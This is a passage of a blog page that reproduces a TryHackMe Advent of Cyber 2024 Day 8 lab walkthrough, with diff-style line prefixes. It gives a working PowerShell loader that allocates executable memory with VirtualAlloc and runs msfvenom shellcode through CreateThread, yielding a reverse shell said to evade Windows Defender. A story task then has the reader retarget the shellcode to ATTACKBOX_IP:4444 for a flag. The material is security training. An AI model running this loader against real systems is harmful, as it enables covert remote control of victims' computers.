+<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1111</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>On the AttackBox, begin by navigating to the Desktop. Right-click on the <code class="language-plaintext highlighter-rouge">Desktop</code>, select <code class="language-plaintext highlighter-rouge">Create Document</code>, and then choose <code class="language-plaintext highlighter-rouge">Empty File</code>. Open this new file and paste the previously provided PowerShell script code into it. Look for the part labelled <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> and replace it with the shell code we previously created with <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732683410058.png" alt="creating new file sand saving shellcode" /> \n</p>
+
+<p>Once you’ve added the shellcode navigate to the attached VM, open PowerShell by clicking the PowerShell icon on the taskbar and paste parts of the code from the document you recently created to the Windows PowerShell window. For example, the first part to copy and paste is the block below:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class VrtAlloc{
+    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
+</span><span class="dl">"</span><span class="p">@</span>
+
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>
+
+<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+</span><span class="dl">"</span><span class="p">@</span>
+
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>
+
+<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+}
+</span><span class="dl">"</span><span class="p">@</span>
+<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>
+</code></pre></div></div>
+
+<p>Then paste the line below, replacing the placeholder with the shellcode generated by msfvenom, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
+</code></pre></div></div>
+
+<p>Continue copying and pasting the lines from the code below. Remember, copy one line at a time, paste it, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
+<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>If you’ve done it properly, the PowerShell terminal in the VM will look like the screenshot below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732698537726.png" alt="PowerShell screenshot after executing the script" /> \n</p>
+
+<p>Once you execute the final line in the PowerShell terminal and press <code class="language-plaintext highlighter-rouge">Enter</code>, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuing <code class="language-plaintext highlighter-rouge">dir</code>, which will list all the directories.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1727972837925.png" alt="successful shell screenshot" /></p>
+
+<h2 id="regaining-access">Regaining Access</h2>
+
+<p><em>Now Glitch must act, no time to delay,</em></p>
+
+<p><em>To fix the shellcode and keep foes at bay.</em></p>
+
+<p><em>He tweaks and he codes to set the wrongs right,</em></p>
+
+<p><em>Protecting his secrets with all of his might.</em></p>
+
+<ul>
+  <li>\n *</li>
+</ul>
+
+<p>Let’s dive into the story and troubleshoot the issue in this part of the task. Glitch has realised he’s no longer receiving incoming connections from his home base. Mayor Malware’s minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch is <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code>, and the successful connection port should be <code class="language-plaintext highlighter-rouge">4444</code>.</p>
+
+<p>Can you help Glitch identify and update the shellcode with the correct IP and port to restore the connection and reclaim control?</p>
+
+<p>Answer the questions below</p>
+
+<p>What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the <strong>C:\Users\glitch\Desktop</strong> directory. You can view the content of the flag by using the command <strong>type C:\Users\glitch\Desktop\flag.txt</strong>.</p>
+
+<p>Are you interested in learning more about evasion? Take a look at the <a href="https://tryhackme.com/r/room/avevasionshellcode">AV Evasion: Shellcode</a> room.</p>
+
+  </article>
+  
+    <div class="post-share">
+  <div class="post-date">Feel free to share!</div>
+  <div class="sharing-icons">
+    <a href="https://twitter.com/intent/tweet?text=Day8&amp;url=/Day8" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    <a href="https://www.facebook.com/sharer/sharer.php?u=/Day8&amp;title=Day8" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
+  </div>
+</div>
+
+  
+  
+    <div class="related">
+  <h2>You may also enjoy...</h2>
+  
+  <ul class="related-posts">
+    
+      
+        
+        
+      
+        
+          <li>
+            <h3>
+              <a href="/Day7">
+                <div class="related-thumbnail">
+                  
+                    <img src="http://localhost:4000/assets/img/Day7-logo.png">
+                  
+                </div>
+                <div class="related-title">
+                  Try Hackme Advent of Cyber - Day 7
+                </div>
+                <!--<small>December 7, 2024</small>-->
+              </a>
+            </h3>
+          </li>
+          
+        
+      
+    
+      
+        
+        
+      
+        
+        
+      
+    
+  </ul>
+</div>
+
+  
+  
+    <section class="disqus">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = "millennial-3";
+    var disqus_identifier = "/Day8";
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+  
+</div>
+
+      </div>
+      <footer class="footer">
+  
+    <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+  
+    <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+  
+  <div class="footer-description"><a href="/">THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication by Michael</a></div>
+</footer>
+
+    </div>
+  </body>
+</html>
